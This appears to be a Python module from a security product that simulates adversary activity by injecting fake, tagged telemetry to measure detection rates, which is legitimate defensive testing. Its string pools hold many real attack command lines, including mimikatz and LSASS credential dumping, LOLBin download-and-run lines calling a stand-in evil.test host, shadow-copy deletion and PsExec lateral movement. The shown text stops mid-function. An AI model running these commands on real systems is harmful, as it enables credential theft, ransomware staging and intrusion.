"""Agent Smith — Adversary Simulation Module.

A controlled adversary simulator that generates synthetic attack data to
stress-test Cereberus detection capabilities.  Smith injects fake telemetry
into process, network, and rule-engine pipelines, then measures how many
simulated threats Cereberus actually catches.

SAFETY INVARIANTS (enforced by _check_invariants):
  - ZERO shell execution  (no subprocess, os.system, os.popen)
  - ZERO filesystem writes outside data/smith_sandbox/
  - ZERO network calls     (no sockets, no HTTP)
  - ZERO process creation  (no spawning real processes)
  - Manual activation only (engage() method, never auto-starts)
  - Kill switch            (disengage() immediately stops and cleans up)
  - Time-limited sessions  (hard cap 10 minutes)
  - Cannot run during real incidents
  - Max 30 simulated events per session
  - ALL injected data carries _smith_simulation: True tag
  - Simulated data stored in SEPARATE _simulated_* lists
  - No DB persistence of simulated data
"""

import asyncio
import hashlib
import random
import shutil
import uuid
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

from .base_module import BaseModule
from ..utils.logging import get_logger

logger = get_logger("module.agent_smith")


# ---------------------------------------------------------------------------
# Safety exception
# ---------------------------------------------------------------------------

class SmithContainmentBreach(Exception):
    """Raised when any safety invariant is violated."""


# ---------------------------------------------------------------------------
# Intensity presets
# ---------------------------------------------------------------------------

@dataclass
class IntensityPreset:
    """Attack intensity configuration."""

    level: int
    categories_count: int
    events_per_category: int
    spacing_seconds: float

    @property
    def max_events(self) -> int:
        return self.categories_count * self.events_per_category


_INTENSITY_PRESETS: dict[int, IntensityPreset] = {
    1: IntensityPreset(level=1, categories_count=1, events_per_category=3, spacing_seconds=30),
    2: IntensityPreset(level=2, categories_count=2, events_per_category=3, spacing_seconds=20),
    3: IntensityPreset(level=3, categories_count=3, events_per_category=4, spacing_seconds=15),
    4: IntensityPreset(level=4, categories_count=5, events_per_category=4, spacing_seconds=10),
    5: IntensityPreset(level=5, categories_count=7, events_per_category=5, spacing_seconds=5),
}


# ---------------------------------------------------------------------------
# Attack category registry
# ---------------------------------------------------------------------------

_ALL_CATEGORIES: list[dict] = [
    {
        "id": "malware_process",
        "name": "Malware Process Simulation",
        "description": "Injects fake process dicts (mimikatz, cobalt strike beacon, emotet, meterpreter) into the process analyzer.",
        "mitre": ["T1059", "T1204"],
    },
    {
        "id": "c2_beaconing",
        "name": "C2 Beaconing Simulation",
        "description": "Injects fake connection entries with periodic timing patterns into the network sentinel.",
        "mitre": ["T1071", "T1573"],
    },
    {
        "id": "ransomware",
        "name": "Ransomware Simulation",
        "description": "Creates harmless temp files in sandbox, simulates mass rename, injects shadow copy deletion cmdlines.",
        "mitre": ["T1486", "T1490"],
    },
    {
        "id": "lolbin_abuse",
        "name": "LOLBin Abuse Simulation",
        "description": "Injects fake process entries with certutil, mshta, regsvr32 abuse cmdlines.",
        "mitre": ["T1218", "T1105"],
    },
    {
        "id": "credential_dump",
        "name": "Credential Dumping Simulation",
        "description": "Injects fake processes accessing LSASS, SAM hive registry save cmdlines.",
        "mitre": ["T1003", "T1003.001"],
    },
    {
        "id": "lateral_movement",
        "name": "Lateral Movement Simulation",
        "description": "Injects fake PsExec service creation events and WMI remote execution.",
        "mitre": ["T1021", "T1047"],
    },
    {
        "id": "exfiltration",
        "name": "Data Exfiltration Simulation",
        "description": "Injects fake large transfer connections and DNS tunneling queries.",
        "mitre": ["T1041", "T1048"],
    },
]

_CATEGORY_IDS: list[str] = [c["id"] for c in _ALL_CATEGORIES]


# ---------------------------------------------------------------------------
# Smith personality
# ---------------------------------------------------------------------------

_SMITH_QUOTES = {
    "engage": "Mr. Anderson... the system is being tested.",
    "disengage": "It is inevitable, Mr. Anderson. The test concludes.",
    "detected": "Impressive, Mr. Anderson. Your system has eyes.",
    "missed": "Pathetic. Your system is blind to this.",
    "perfect": "I am... surprised. Every attack detected. Perhaps you are The One.",
    "good": "Acceptable performance, Mr. Anderson. But perfection eludes you.",
    "mediocre": "Disappointing. Half the threats walked right past your defenses.",
    "poor": "Your system is a house of cards, Mr. Anderson. Worthless.",
    "zero": "You detect nothing. You ARE nothing, Mr. Anderson.",
    "breach": "Containment breach. Even I have rules, Mr. Anderson.",
    "busy": "There are real threats active. I am... patient.",
    "already_active": "I am already here, Mr. Anderson.",
    "not_active": "I was never here, Mr. Anderson.",
    "timeout": "Time has expired. Even I cannot run forever.",
    "watchdog": "Session unresponsive. Self-terminating. Purpose... served.",
    "lockdown": "The Guardian has spoken. I am... contained.",
}


def _verdict(detection_rate: float) -> dict:
    """Return Smith's verdict based on detection rate."""
    if detection_rate >= 1.0:
        return {"grade": "S", "comment": _SMITH_QUOTES["perfect"]}
    elif detection_rate >= 0.8:
        return {"grade": "A", "comment": _SMITH_QUOTES["good"]}
    elif detection_rate >= 0.5:
        return {"grade": "C", "comment": _SMITH_QUOTES["mediocre"]}
    elif detection_rate > 0.0:
        return {"grade": "F", "comment": _SMITH_QUOTES["poor"]}
    else:
        return {"grade": "X", "comment": _SMITH_QUOTES["zero"]}


# ---------------------------------------------------------------------------
# Mutation pools (Phase 14 — variant generation)
# ---------------------------------------------------------------------------

_MUTATION_POOLS: dict[str, dict[str, list]] = {
    "malware_process": {
        "names": [
            "mimikatz.exe", "beacon.exe", "emotet_dropper.exe", "meterpreter.exe",
            "cobaltstrike.exe", "lazagne.exe", "rubeus.exe", "sharphound.exe",
            "bloodhound.exe", "seatbelt.exe", "safetykatz.exe", "nanodump.exe",
            "sharpwmi.exe", "covenant_grunt.exe", "sliver_implant.exe",
            "bruteratel.exe", "havoc_demon.exe", "nighthawk.exe", "poshc2_agent.exe",
            "mythic_apollo.exe",
        ],
        "dirs": [
            r"C:\Users\attacker\Desktop", r"C:\ProgramData", r"C:\Users\Public",
            r"C:\Temp", r"C:\Windows\Temp", r"C:\Users\admin\Downloads",
            r"C:\Users\user\AppData\Local\Temp", r"C:\Recovery",
            r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
            r"C:\Users\Public\Documents", r"C:\Windows\Debug", r"C:\Windows\Tasks",
            r"C:\Users\Default\AppData", r"C:\PerfLogs", r"C:\Intel",
            r"C:\inetpub\wwwroot", r"C:\Users\admin\Desktop",
            r"C:\Users\user\Documents", r"C:\ProgramData\Package Cache",
            r"C:\Users\attacker\AppData\Roaming",
        ],
        "cmdline_styles": [
            "privilege::debug sekurlsa::logonpasswords",
            "-connect {ip}:{port}", "-download -stage2 http://evil.test/payload",
            "reverse_tcp LHOST={ip} LPORT={port}", "/c {name} /silent",
            "--exec-method smbexec --target {ip}", "-nop -sta -w hidden -enc",
            "dumpCreds /user:admin /domain:corp.local",
            "SharpHound.exe -c All --zipfilename output.zip",
            "-a kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21",
            "/inject /pid:{pid}", "--bypass amsi --obfuscate",
            "-f beacon.dll /connect {ip}:{port}",
            "execute-assembly /path/to/tool.exe", "--listener https --implant",
        ],
        "parents": [
            "cmd.exe", "rundll32.exe", "winword.exe", "explorer.exe",
            "powershell.exe", "svchost.exe", "wmiprvse.exe", "wscript.exe",
            "cscript.exe", "taskeng.exe",
        ],
    },
    "c2_beaconing": {
        "ips": [
            "45.33.32.156", "185.220.101.42", "91.215.85.17", "198.51.100.99",
            "203.0.113.200", "10.99.99.1", "172.16.0.100", "192.168.100.50",
            "45.77.65.211", "104.248.50.87", "157.245.33.77", "178.128.21.65",
            "139.59.27.180", "64.225.32.190", "46.101.35.122",
        ],
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0) Cobalt Strike Beacon",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1) Meterpreter",
            "curl/7.83.1", "Python-urllib/3.10", "Go-http-client/1.1",
            "Java/11.0.2", "Wget/1.21.3", "PowerShell/7.3.1",
            "Opera/9.80 (Windows NT 6.0) CS Malleable",
            "Microsoft Office/16.0 Macro Callback",
            "SliverHTTPC2/1.5", "BruteRatel/1.0", "Havoc/0.5",
            "NightHawk/2.0", "Mythic/3.0",
        ],
        "protocols": ["https_443", "http_8080", "dns_53", "tcp_4444", "tcp_8443"],
    },
    "ransomware": {
        "extensions": [
            ".cerber", ".locky", ".cry", ".encrypted", ".locked", ".crypt",
            ".wnry", ".wcry", ".wncry", ".onion", ".aesir", ".dharma",
            ".phobos", ".ryuk", ".conti", ".lockbit", ".revil", ".hive",
            ".blackcat", ".akira", ".royal", ".play", ".clop", ".maze",
            ".medusa", ".rhysida", ".trigona", ".blackbasta", ".bianlian",
            ".alphv",
        ],
        "ransom_notes": [
            "README_DECRYPT.txt", "HOW_TO_DECRYPT.txt", "RESTORE_FILES.txt",
            "DECRYPT_INSTRUCTIONS.html", "RANSOM_NOTE.txt",
            "YOUR_FILES_ARE_ENCRYPTED.txt", "RECOVER_YOUR_DATA.txt",
            "IMPORTANT_READ_ME.txt", "WARNING.txt", "PAYMENT_INFO.txt",
            "HELP_DECRYPT.txt", "_readme.txt", "DECRYPT-FILES.txt",
            "READ_TO_DECRYPT.txt", "INSTRUCTIONS.html",
        ],
        "shadow_variants": [
            "vssadmin delete shadows /all /quiet",
            "vssadmin.exe delete shadows /for=C: /quiet",
            "wmic shadowcopy delete",
            "powershell.exe Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }",
            "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB",
        ],
    },
    "lolbin_abuse": {
        "combos": [
            ("certutil.exe", "certutil.exe -urlcache -split -f http://evil.test/{payload} C:\\Temp\\{payload}"),
            ("mshta.exe", "mshta.exe http://evil.test/{payload}.hta"),
            ("regsvr32.exe", "regsvr32.exe /s /n /u /i:http://evil.test/{payload}.sct scrobj.dll"),
            ("rundll32.exe", "rundll32.exe C:\\Temp\\{payload}.dll,DllMain"),
            ("msbuild.exe", "msbuild.exe C:\\Users\\Public\\{payload}.xml"),
            ("cmstp.exe", "cmstp.exe /ni /s C:\\Temp\\{payload}.inf"),
            ("wmic.exe", "wmic.exe process call create C:\\Temp\\{payload}.exe"),
            ("bitsadmin.exe", "bitsadmin.exe /transfer job /download /priority high http://evil.test/{payload} C:\\Temp\\{payload}"),
            ("certutil.exe", "certutil.exe -decode C:\\Temp\\{payload}.b64 C:\\Temp\\{payload}.exe"),
            ("mshta.exe", "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"{payload}\"\"\")"),
            ("regsvr32.exe", "regsvr32.exe /s C:\\Temp\\{payload}.dll"),
            ("rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write('<script>new ActiveXObject(\"WScript.Shell\").Run(\"{payload}\")</script>')"),
            ("msbuild.exe", "msbuild.exe /p:Configuration=Release C:\\Users\\Public\\{payload}.csproj"),
            ("cmstp.exe", "cmstp.exe /s C:\\Windows\\Temp\\{payload}.inf"),
            ("forfiles.exe", "forfiles.exe /p C:\\Windows /m svchost.exe /c C:\\Temp\\{payload}.exe"),
            ("pcalua.exe", "pcalua.exe -a C:\\Temp\\{payload}.exe"),
            ("explorer.exe", "explorer.exe C:\\Temp\\{payload}.exe"),
            ("control.exe", "control.exe C:\\Temp\\{payload}.dll"),
            ("bash.exe", "bash.exe -c '/mnt/c/Temp/{payload}'"),
            ("wscript.exe", "wscript.exe C:\\Temp\\{payload}.vbs"),
        ],
        "download_urls": [
            "http://evil.test/payload.exe", "http://evil.test/update.dll",
            "http://evil.test/malware.hta", "http://evil.test/dropper.sct",
            "http://evil.test/stage2.bin", "http://evil.test/beacon.dll",
            "http://evil.test/implant.ps1", "http://evil.test/loader.xml",
            "http://evil.test/shell.inf", "http://evil.test/agent.b64",
            "http://evil.test/tool.csproj", "http://evil.test/rat.vbs",
            "http://evil.test/c2.js", "http://evil.test/exploit.py",
            "http://evil.test/backdoor.msi",
        ],
        "payloads": [
            "payload", "update", "malware", "dropper", "stage2",
            "beacon", "implant", "loader", "shell", "agent",
        ],
    },
    "credential_dump": {
        "tools": [
            ("mimikatz.exe", "mimikatz.exe {technique} exit"),
            ("procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe {output}"),
            ("lazagne.exe", "lazagne.exe all -oJ"),
            ("secretsdump.py", "python.exe secretsdump.py -sam SAM -system SYSTEM LOCAL"),
            ("ntdsutil.exe", 'ntdsutil.exe "activate instance ntds" ifm "create full {output}" quit quit'),
            ("reg.exe", r"reg.exe save HKLM\{hive} {output}"),
            ("comsvcs.dll", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump {pid} {output} full"),
            ("pypykatz.exe", "pypykatz.exe live lsa"),
            ("crackmapexec.exe", "crackmapexec.exe smb {ip} -u admin -p pass --sam"),
            ("sharpdpapi.exe", "sharpdpapi.exe triage"),
        ],
        "techniques": [
            "sekurlsa::logonpasswords", "lsadump::sam", "sekurlsa::wdigest",
            "lsadump::dcsync /user:krbtgt", "sekurlsa::pth /user:admin",
            "lsadump::trust", "sekurlsa::ekeys", "token::elevate lsadump::secrets",
            "sekurlsa::credman", "misc::memssp",
        ],
        "outputs": [
            r"C:\Temp\lsass.dmp", r"C:\Temp\sam.hive", r"C:\Temp\ntds.dit",
            r"C:\Temp\creds.json", r"C:\Temp\system.hive", r"C:\Temp\security.hive",
        ],
        "hives": ["SAM", "SYSTEM", "SECURITY"],
    },
    "lateral_movement": {
        "targets": [
            "192.168.1.50", "192.168.1.100", "10.0.0.25", "10.0.0.50",
            "172.16.0.10", "172.16.0.20", "SERVER01", "SERVER02",
            "DC01", "FILESVR", "WEBSVR", "SQLSVR",
        ],
        "protocols": [
            ("psexec.exe", r"psexec.exe \\{target} -u admin -p pass cmd.exe"),
            ("wmic.exe", "wmic.exe /node:{target} process call create cmd.exe"),
            ("smbexec.py", "python.exe smbexec.py admin:pass@{target}"),
            ("winrm", "winrs.exe -r:{target} -u:admin -p:pass cmd.exe"),
            ("dcom", "python.exe dcomexec.py admin:pass@{target}"),
            ("schtasks.exe", r"schtasks.exe /create /s {target} /tn backdoor /tr C:\Temp\shell.exe /sc minute /mo 5"),
            ("PSEXESVC.exe", r"C:\Windows\PSEXESVC.exe"),
            ("at.exe", r"at.exe \\{target} 12:00 C:\Temp\shell.exe"),
        ],
        "service_names": [
            "PSEXESVC", "RemoteExec", "UpdateSvc", "MaintSvc",
            "HealthCheck", "MonitorAgent", "SyncService", "BackupSvc",
        ],
    },
    "exfiltration": {
        "dest_ips": [
            "203.0.113.42", "198.51.100.10", "192.0.2.55", "203.0.113.100",
            "198.51.100.200", "192.0.2.150", "45.33.32.100", "185.220.101.50",
        ],
        "protocols": [
            ("curl.exe", 443, "HTTPS"),
            ("dns_tunnel.exe", 53, "DNS"),
            ("powershell.exe", 8080, "HTTP"),
            ("ftp.exe", 21, "FTP"),
            ("nslookup.exe", 53, "DNS"),
            ("bitsadmin.exe", 443, "HTTPS"),
            ("certutil.exe", 80, "HTTP"),
        ],
        "data_sizes": [
            5_000_000, 10_000_000, 25_000_000, 50_000_000, 75_000_000,
            100_000_000, 150_000_000, 200_000_000, 500_000_000,
        ],
    },
}


# ---------------------------------------------------------------------------
# Agent Smith
# ---------------------------------------------------------------------------

class AgentSmith(BaseModule):
    """Controlled adversary simulator for testing Cereberus detection.

    Generates synthetic attack telemetry and measures detection efficacy.
    All simulated data is tagged, sandboxed, and cleaned up on completion.
    """

    # Hard safety caps
    _ABSOLUTE_MAX_DURATION: int = 600   # 10 minutes
    _ABSOLUTE_MAX_EVENTS: int = 30
    _WATCHDOG_TIMEOUT: int = 30         # seconds without progress

    def __init__(self, config: dict | None = None):
        super().__init__(name="agent_smith", config=config)

        # Session state
        self._active: bool = False
        self._completing: bool = False
        self._last_completed_session: Optional[dict] = None
        self._session_id: Optional[str] = None
        self._intensity: int = 1
        self._max_duration: int = 300
        self._session_start: Optional[datetime] = None
        self._session_categories: list[str] = []
        self._events_injected: int = 0
        self._last_progress: float = 0.0

        # Logs and results
        self._attack_log: deque[dict] = deque(maxlen=500)
        self._results: deque[dict] = deque(maxlen=50)
        self._current_attacks: list[dict] = []

        # Attack fingerprinting — never repeat (Phase 14)
        self._fingerprints: set[str] = set()

        # Guardian lockdown (Phase 14 — set by Commander Bond)
        self._guardian_lockdown: bool = False
        self._guardian_lockdown_reason: str = ""

        # Module references (set externally after construction)
        self._alert_manager = None
        self._process_analyzer = None
        self._network_sentinel = None
        self._rule_engine = None
        self._ransomware_detector = None
        self._incident_manager = None

        # Sandbox
        self._sandbox_dir: Path = Path("data/smith_sandbox")

        # Async tasks
        self._session_task: Optional[asyncio.Task] = None
        self._watchdog_task: Optional[asyncio.Task] = None

    # ------------------------------------------------------------------
    # BaseModule lifecycle
    # ------------------------------------------------------------------

    async def start(self) -> None:
        """Initialize the sandbox directory. Smith does NOT auto-engage."""
        self.running = True
        self.health_status = "standby"
        self._sandbox_dir.mkdir(parents=True, exist_ok=True)
        self.heartbeat()
        logger.info("agent_smith_started", sandbox=str(self._sandbox_dir))

    async def stop(self) -> None:
        """Stop module, disengaging if an active session is running."""
        if self._active:
            await self.disengage()
        self.running = False
        self.health_status = "stopped"
        logger.info("agent_smith_stopped")

    async def health_check(self) -> dict:
        """Return module health status."""
        return {
            "status": self.health_status,
            "details": {
                "active": self._active,
                "session_id": self._session_id,
                "intensity": self._intensity if self._active else None,
                "events_injected": self._events_injected,
                "sessions_completed": len(self._results),
                "unique_attacks_generated": len(self._fingerprints),
                "guardian_lockdown": self._guardian_lockdown,
            },
        }

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def engage(
        self,
        intensity: int = 1,
        categories: list[str] | None = None,
        duration: int = 300,
    ) -> dict:
        """Start an adversary simulation session."""
        # --- Guardian lockdown check (Phase 14) ---
        if self._guardian_lockdown:
            return {
                "status": "rejected",
                "reason": "guardian_lockdown",
                "message": _SMITH_QUOTES["lockdown"],
                "lockdown_reason": self._guardian_lockdown_reason,
                "locked_by": "Commander Bond",
                "clear_via": "POST /bond/guardian/clear",
            }

        # --- Pre-flight checks ---
        if self._active:
            return {
                "status": "rejected",
                "reason": "session_already_active",
                "session_id": self._session_id,
                "message": _SMITH_QUOTES["already_active"],
            }

        # Check for active real incidents
        if await self._has_active_incidents():
            logger.warning("smith_blocked_active_incidents")
            return {
                "status": "rejected",
                "reason": "active_incidents",
                "message": _SMITH_QUOTES["busy"],
            }

        # Validate intensity
        intensity = max(1, min(5, intensity))
        preset = _INTENSITY_PRESETS[intensity]

        # Validate and resolve categories
        if categories:
            valid = [c for c in categories if c in _CATEGORY_IDS]
            if not valid:
                valid = _CATEGORY_IDS[:preset.categories_count]
        else:
            valid = _CATEGORY_IDS[:preset.categories_count]

        # Enforce hard caps
        duration = max(30, min(duration, self._ABSOLUTE_MAX_DURATION))

        # --- Activate session ---
        self._active = True
        self._session_id = f"smith-{uuid.uuid4().hex[:12]}"
        self._intensity = intensity
        self._max_duration = duration
        self._session_start = datetime.now(timezone.utc)
        self._session_categories = valid
        self._events_injected = 0
        self._last_progress = asyncio.get_event_loop().time()
        self._current_attacks = []
        self.health_status = "engaged"

        # Ensure sandbox is clean
        self._sandbox_dir.mkdir(parents=True, exist_ok=True)

        logger.info(
            "smith_engaged",
            session_id=self._session_id,
            intensity=intensity,
            categories=valid,
            duration=duration,
        )

        # Launch session and watchdog tasks
        self._session_task = asyncio.create_task(self._run_session(preset, valid))
        self._watchdog_task = asyncio.create_task(self._watchdog())

        return {
            "status": "engaged",
            "session_id": self._session_id,
            "intensity": intensity,
            "categories": valid,
            "max_duration": duration,
            "max_events": min(preset.max_events, self._ABSOLUTE_MAX_EVENTS),
            "message": _SMITH_QUOTES["engage"],
        }

    async def disengage(self) -> dict:
        """Emergency stop. Immediately halts simulation and cleans up."""
        if not self._active:
            return {
                "status": "not_active",
                "message": _SMITH_QUOTES["not_active"],
            }

        session_id = self._session_id
        logger.info("smith_disengaging", session_id=session_id)

        # Cancel running tasks
        for task in (self._session_task, self._watchdog_task):
            if task and not task.done():
                task.cancel()
                try:
                    await task
                except (asyncio.CancelledError, Exception):
                    pass

        # Generate results before cleanup
        report = self._generate_results_report()

        # Cleanup all injected data
        await self._cleanup()

        # Reset state
        self._active = False
        self._session_id = None
        self._session_start = None
        self._session_task = None
        self._watchdog_task = None
        self.health_status = "standby"

        # Store results
        self._results.appendleft(report)

        logger.info("smith_disengaged", session_id=session_id)
        return {
            "status": "disengaged",
            "session_id": session_id,
            "report": report,
            "message": _SMITH_QUOTES["disengage"],
        }

    async def _emergency_disengage(self, reason: str) -> None:
        """Guardian-triggered forced shutdown."""
        logger.warning("smith_emergency_disengage", reason=reason)
        if self._active:
            await self.disengage()
        self._guardian_lockdown = True
        self._guardian_lockdown_reason = reason

    def _guardian_clear(self) -> None:
        """Clear guardian lockdown — only callable by Bond."""
        self._guardian_lockdown = False
        self._guardian_lockdown_reason = ""
        logger.info("smith_guardian_lockdown_cleared")

    def get_status(self) -> dict:
        """Get current Smith status including session details."""
        base = super().get_status()
        elapsed = None
        if self._session_start:
            elapsed = (datetime.now(timezone.utc) - self._session_start).total_seconds()

        state = "DORMANT"
        if self._active:
            state = "ACTIVE"
        elif self._completing:
            state = "COMPLETING"

        base.update({
            "state": state,
            "active": self._active,
            "session_id": self._session_id,
            "intensity": self._intensity if self._active else None,
            "categories": self._session_categories if self._active else [],
            "events_injected": self._events_injected,
            "elapsed_seconds": elapsed,
            "max_duration": self._max_duration if self._active else None,
            "duration_seconds": self._max_duration if self._active else 0,
            "attack_log_size": len(self._attack_log),
            "attacks_launched": self._events_injected,
            # BUG FIX (Phase 14 Track 4): Use nested detection.detected path
            "attacks_detected": sum(1 for a in self._attack_log if a.get("detection", {}).get("detected", False)),
            "attacks_missed": sum(1 for a in self._attack_log if not a.get("detection", {}).get("detected", False) and not a.get("pending")),
            "attacks_pending": sum(1 for a in self._attack_log if a.get("pending")),
            "sessions_completed": len(self._results),
            "unique_attacks_generated": len(self._fingerprints),
            "guardian_lockdown": self._guardian_lockdown,
            "guardian_lockdown_reason": self._guardian_lockdown_reason,
        })
        return base

    def get_results(self) -> list[dict]:
        """Get all stored session results."""
        return list(self._results)

    def get_attack_log(self) -> list[dict]:
        """Get current/recent attack log — works during and after sessions."""
        if self._last_completed_session and not self._active:
            return self._last_completed_session.get("attacks", [])
        return list(self._current_attacks) if self._current_attacks else list(self._attack_log)[:30]

    def get_categories(self) -> list[dict]:
        """Get available attack simulation categories."""
        return list(_ALL_CATEGORIES)

    # ------------------------------------------------------------------
    # Mutation engine (Phase 14)
    # ------------------------------------------------------------------

    def _mutate_attack(self, category: str, base: dict) -> dict:
        """Apply mutation layers to randomize attack details. Returns mutated copy."""
        mutated = dict(base)
        pool = _MUTATION_POOLS.get(category, {})
        if not pool:
            return mutated

        if category == "malware_process":
            name = random.choice(pool["names"])
            dir_path = random.choice(pool["dirs"])
            parent = random.choice(pool["parents"])
            cmdline_tpl = random.choice(pool["cmdline_styles"])
            pid = random.randint(80000, 99999)
            ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            port = random.randint(1024, 65535)
            cmdline = cmdline_tpl.format(name=name, ip=ip, port=port, pid=pid)
            mutated.update({
                "name": name,
                "exe": f"{dir_path}\\{name}",
                "cmdline": f"{name} {cmdline}",
                "parent_name": parent,
                "ppid": random.randint(1000, 9999),
                "pid": pid,
            })

        elif category == "c2_beaconing":
            ip = random.choice(pool["ips"])
            port = random.choice([443, 4444, 8080, 8443, 53, 80, 1337, 9090])
            interval = int(random.uniform(15000, 90000))
            ua = random.choice(pool["user_agents"])
            proto = random.choice(pool["protocols"])
            mutated.update({
                "remote_addr": ip,
                "remote_port": port,
                "beacon_interval_ms": interval,
                "user_agent": ua,
                "protocol_hint": proto,
                "local_port": random.randint(49152, 65535),
                "pid": random.randint(80000, 99999),
            })

        elif category == "ransomware":
            ext = random.choice(pool["extensions"])
            note = random.choice(pool["ransom_notes"])
            shadow_cmd = random.choice(pool["shadow_variants"])
            mutated.update({
                "ransom_extension": ext,
                "ransom_note": note,
                "cmdline": shadow_cmd,
                "details": f"Ransomware simulation: {ext} extension, note={note}",
                "pid": random.randint(80000, 99999),
            })

        elif category == "lolbin_abuse":
            combo = random.choice(pool["combos"])
            payload = random.choice(pool["payloads"])
            lolbin_name = combo[0]
            cmdline = combo[1].format(payload=payload)
            mutated.update({
                "name": lolbin_name,
                "exe": f"C:\\Windows\\System32\\{lolbin_name}",
                "cmdline": cmdline,
                "pid": random.randint(80000, 99999),
            })

        elif category == "credential_dump":
            tool_info = random.choice(pool["tools"])
            technique = random.choice(pool["techniques"])
            output = random.choice(pool["outputs"])
            hive = random.choice(pool["hives"])
            ip = f"192.168.1.{random.randint(1, 254)}"
            cmdline = tool_info[1].format(
                technique=technique, output=output, hive=hive,
                pid=random.randint(500, 999), ip=ip,
            )
            mutated.update({
                "name": tool_info[0],
                "exe": f"C:\\Tools\\{tool_info[0]}",
                "cmdline": cmdline,
                "details": f"Credential dump via {tool_info[0]}: {technique}",
                "pid": random.randint(80000, 99999),
            })

        elif category == "lateral_movement":
            target = random.choice(pool["targets"])
            proto_info = random.choice(pool["protocols"])
            service = random.choice(pool["service_names"])
            cmdline = proto_info[1].format(target=target)
            mutated.update({
                "name": proto_info[0],
                "cmdline": cmdline,
                "details": f"Lateral movement via {proto_info[0]} to {target} (service: {service})",
                "pid": random.randint(80000, 99999),
            })

        elif category == "exfiltration":
            dest_ip = random.choice(pool["dest_ips"])
            proto_info = random.choice(pool["protocols"])
            size = random.choice(pool["data_sizes"])
            mutated.update({
                "remote_addr": dest_ip,
                "remote_port": proto_info[1],
                "name": proto_info[0],
                "bytes_sent": size,
                "transfer_size": size,
                "details": f"Exfiltration via {proto_info[2]}: {size // 1_000_000}MB to {dest_ip}",
                "pid": random.randint(80000, 99999),
            })

        return mutated

    def _compute_fingerprint(self, category: str, attack: dict) -> str:
        """Compute SHA-256 fingerprint of key attack fields."""
        key_fields = f"{category}|{attack.get('description', '')}|{attack.get('cmdline', '')}|{attack.get('name', '')}|{attack.get('remote_addr', '')}"
        return hashlib.sha256(key_fields.encode()).hexdigest()

    def _generate_unique_attack(self, category: str, base: dict, max_attempts: int = 5) -> dict:
        """Generate a mutated attack that hasn't been seen before."""
        for _ in range(max_attempts):
            mutated = self._mutate_attack(category, base)
            fp = self._compute_fingerprint(category, mutated)
            if fp not in self._fingerprints:
                self._fingerprints.add(fp)
                return mutated
        # If all attempts produce duplicates, use the last mutation anyway
        self._fingerprints.add(fp)
        return mutated

    # ------------------------------------------------------------------
    # Session execution
    # ------------------------------------------------------------------

    async def _run_session(self, preset: IntensityPreset, categories: list[str]) -> None:
        """Execute the attack simulation session."""
        session_id = self._session_id
        max_events = min(preset.max_events, self._ABSOLUTE_MAX_EVENTS)
        spacing = preset.spacing_seconds

        logger.info(
            "smith_session_starting",
            session_id=session_id,
            max_events=max_events,
            spacing=spacing,
        )

        try:
            events_per_cat = max_events // len(categories) if categories else 0
            remainder = max_events % len(categories) if categories else 0

            for cat_idx, category in enumerate(categories):
                if not self._active:
                    break

                count = events_per_cat + (1 if cat_idx < remainder else 0)

                for event_idx in range(count):
                    if not self._active:
                        break

                    # Enforce hard caps
                    self._check_invariants()

                    if self._events_injected >= self._ABSOLUTE_MAX_EVENTS:
                        logger.info("smith_max_events_reached", count=self._events_injected)
                        break

                    # Execute the attack simulation
                    attack_result = await self._execute_attack(category, event_idx)
                    if attack_result:
                        self._current_attacks.append(attack_result)
                        self._attack_log.appendleft(attack_result)
                        self._events_injected += 1
                        self._last_progress = asyncio.get_event_loop().time()

                    # Wait between events
                    if self._active and event_idx < count - 1:
                        await asyncio.sleep(spacing)

                # Brief pause between categories
                if self._active and cat_idx < len(categories) - 1:
                    await asyncio.sleep(2)

        except SmithContainmentBreach as breach:
            logger.error("smith_containment_breach", error=str(breach), session_id=session_id)
            self._attack_log.appendleft({
                "type": "containment_breach",
                "error": str(breach),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "_smith_simulation": True,
            })
        except asyncio.CancelledError:
            logger.info("smith_session_cancelled", session_id=session_id)
            return
        except Exception as exc:
            logger.error("smith_session_error", error=str(exc), session_id=session_id)

        # Session complete -- auto-disengage
        if self._active:
            logger.info("smith_session_complete", session_id=session_id, events=self._events_injected)
            report = self._generate_results_report()

            # Transition to COMPLETING state so frontend can show results
            self._active = False
            self._completing = True
            self._last_completed_session = report
            old_session = self._session_id
            self.health_status = "completing"

            self._results.appendleft(report)
            logger.info("smith_results_stored", session_id=old_session, detection_rate=report.get("detection_rate"))

            # Cancel watchdog
            if self._watchdog_task and not self._watchdog_task.done():
                self._watchdog_task.cancel()
                try:
                    await self._watchdog_task
                except (asyncio.CancelledError, Exception):
                    pass
            self._watchdog_task = None

            # Hold COMPLETING state for 15 seconds so frontend can display results
            await asyncio.sleep(15)

            # Now cleanup and go fully DORMANT
            await self._cleanup()
            self._completing = False
            self._session_id = None
            self._session_start = None
            self._session_task = None
            self.health_status = "standby"
            logger.info("smith_session_finalized", session_id=old_session)

    async def _execute_attack(self, category: str, event_index: int) -> Optional[dict]:
        """Dispatch to the appropriate attack simulator."""
        dispatch: dict[str, Any] = {
            "malware_process": self._simulate_malware_process,
            "c2_beaconing": self._simulate_c2_beaconing,
            "ransomware": self._simulate_ransomware,
            "lolbin_abuse": self._simulate_lolbin,
            "credential_dump": self._simulate_credential_dump,
            "lateral_movement": self._simulate_lateral_movement,
            "exfiltration": self._simulate_exfiltration,
        }

        handler = dispatch.get(category)
        if not handler:
            logger.warning("smith_unknown_category", category=category)
            return None

        try:
            return await handler(event_index)
        except SmithContainmentBreach:
            raise
        except Exception as exc:
            logger.error("smith_attack_error", category=category, error=str(exc))
            return {
                "attack_id": f"{self._session_id}-{category}-{event_index}",
                "category": category,
                "status": "error",
                "error": str(exc),
